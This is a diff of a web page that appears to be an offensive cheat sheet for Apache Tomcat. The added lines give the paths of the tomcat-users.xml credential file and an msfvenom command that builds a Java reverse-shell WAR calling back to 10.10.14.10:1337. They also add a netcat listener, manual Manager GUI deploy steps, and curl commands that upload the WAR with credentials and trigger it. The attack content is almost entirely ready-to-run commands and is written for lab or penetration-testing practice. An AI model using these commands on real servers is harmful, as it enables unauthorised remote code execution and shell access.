@@ -47,16 +47,25 @@
 </ul>
 
 <div class="content"><hr>
-<h3 id="rce-authenicated">RCE (Authenicated)</h3>
+<h3 id="config-location">Config Location</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/usr/share/tomcat9/etc/tomcat-users.xml
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/etc/tomcat9/tomcat-users.xml
+</span></span></code></pre></div><h3 id="rce-authenicated">RCE (Authenicated)</h3>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Create malicious WAR file</span>
-</span></span><span class="line"><span class="cl">msfvenom -p java/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.7 <span class="nv">LPORT</span><span class="o">=</span><span class="m">1337</span> -f war -o revshell.war
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">+------------------------------------------+
+</span></span><span class="line"><span class="cl">msfvenom -p java/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.10 <span class="nv">LPORT</span><span class="o">=</span><span class="m">1337</span> -f war -o revshell.war
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Open a nc listener</span>
+</span></span><span class="line"><span class="cl">rlwrap nc -lvnp <span class="m">1337</span>
+</span></span></code></pre></div><h4 id="manager-gui">Manager GUI</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">+------------------------------------------+
 </span></span><span class="line"><span class="cl"><span class="p">|</span>Exploit                                   <span class="p">|</span>
 </span></span><span class="line"><span class="cl">+------------------------------------------+
 </span></span><span class="line"><span class="cl"><span class="p">|</span>1. Login to Tomcat Web Application Manager<span class="p">|</span>
 </span></span><span class="line"><span class="cl"><span class="p">|</span>2. WAR file to deploy -&gt; Deploy           <span class="p">|</span>
 </span></span><span class="line"><span class="cl"><span class="p">|</span>3. Click /revshell in Applications table  <span class="p">|</span>
 </span></span><span class="line"><span class="cl">+------------------------------------------+
+</span></span></code></pre></div><h4 id="manager-script">Manager Script</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -u <span class="s1">&#39;username:password&#39;</span> http://10.10.11.10:8080/manager/text/deploy?path<span class="o">=</span>/revshell --upload-file revshell.war
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -s http://10.10.11.10:8080/revshell
 </span></span></code></pre></div><br>
 </div></div>
     
